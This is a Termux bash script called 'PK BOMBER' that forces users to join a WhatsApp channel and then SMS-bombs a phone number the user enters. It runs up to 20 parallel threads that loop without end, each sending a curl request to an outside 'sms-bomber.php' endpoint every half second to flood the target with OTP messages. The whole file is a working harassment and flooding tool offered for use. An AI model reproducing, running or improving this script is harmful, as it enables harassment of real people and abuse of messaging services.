#!/data/data/com.termux/files/usr/bin/bash

# Show banner
clear
echo -e "\033[1;31m"
echo " ██████╗ ██╗  ██╗    ██████╗  ██████╗ ███╗   ███╗██████╗ ███████╗██████╗ "
echo " ██╔══██╗██║ ██╔╝    ██╔══██╗██╔═══██╗████╗ ████║██╔══██╗██╔════╝██╔══██╗"
echo " ██████╔╝█████╔╝     ██████╔╝██║   ██║██╔████╔██║██████╔╝█████╗  ██████╔╝"
echo " ██╔═══╝ ██╔═██╗     ██╔══██╗██║   ██║██║╚██╔╝██║██╔══██╗██╔══╝  ██╔══██╗"
echo " ██║     ██║  ██╗    ██████╔╝╚██████╔╝██║ ╚═╝ ██║██████╔╝███████╗██║  ██║"
echo " ╚═╝     ╚═╝  ╚═╝    ╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚═════╝ ╚══════╝╚═╝  ╚═╝"
echo -e "\033[0m"
echo -e "\033[1;33m> Developer: OLD-HACKER\033[0m"
echo -e "\033[1;34m----------------------------------------\033[0m"

# WhatsApp channel requirement
echo -e "\033[1;32m"
echo "YOU MUST JOIN OUR WHATSAPP CHANNEL TO USE THIS TOOL"
echo "Channel Link:"
echo "https://whatsapp.com/channel/0029VavHzv259PwTIz1XxJ09"
echo -e "\033[0m"
echo -e "\033[1;34m----------------------------------------\033[0m"

read -p "Have you joined the channel? (y/n): " joined
if [ "$joined" != "y" ]; then
    echo "Please join our WhatsApp channel first!"
    exit 1
fi

# API URL
api_url="https://shadowtools.site/sms-bomber.php"

# Get mobile number
read -p "Enter Mobile Number (without country code, e.g. 03004400440): " mobile_number

# Validate mobile number format
if [[ ! $mobile_number =~ ^[0-9]{10,12}$ ]]; then
    echo "Invalid mobile number format! Please enter number without '+' or spaces."
    exit 1
fi

# Get thread count for parallel requests
read -p "Enter number of parallel threads (1-20, more=faster): " threads
threads=${threads:-5}  # Default to 5 if empty
if [[ $threads -lt 1 || $threads -gt 20 ]]; then
    threads=5
fi

# Continuous OTP bombing
count=1
echo -e "\033[1;32mStarting SMS Bombing with $threads parallel threads...\033[0m"
echo -e "\033[1;31mPress Ctrl+C to STOP\033[0m"
echo -e "\033[1;34m----------------------------------------\033[0m"

# Function to send OTP
send_otp() {
    local request_num=$1
    while true; do
        response=$(curl -s -X GET "$api_url?num=$mobile_number")
        echo -e "\033[1;34mThread $request_num - Request #$count: $response\033[0m"
        ((count++))
        sleep 0.5  # Small delay between requests from same thread
    done
}

# Start multiple threads
for ((i=1; i<=threads; i++)); do
    send_otp $i &
done

# Keep main process running
wait
